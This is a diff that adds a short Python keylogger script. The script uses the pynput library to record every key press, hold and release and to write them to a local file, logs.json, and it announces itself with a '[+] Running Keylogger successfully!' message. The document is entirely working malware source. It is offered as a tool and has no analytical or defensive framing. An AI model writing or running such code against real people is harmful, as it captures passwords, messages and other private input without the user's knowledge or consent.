@@ -1,0 +1,34 @@
+from pynput import keyboard
+import json
+
+key_list = []
+x = False
+key_strokes = ""
+
+def update_json_file(key_list):
+    with open('logs.json', 'w+') as key_strokes_file:
+        key_list_str = json.dumps(key_list)
+        key_strokes_file.write(key_list_str)
+
+def on_press(key):
+    global x, key_list
+    if x == False:
+        key_list.append(('Pressed', str(key)))
+        x = True
+    if x == True:
+        key_list.append(('Held', str(key)))
+    update_json_file(key_list)
+
+def on_release(key):
+    global x, key_list, key_strokes
+    key_list.append(('Released', str(key)))
+    if x == True:
+        x = False
+    update_json_file(key_list)
+
+print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
+
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
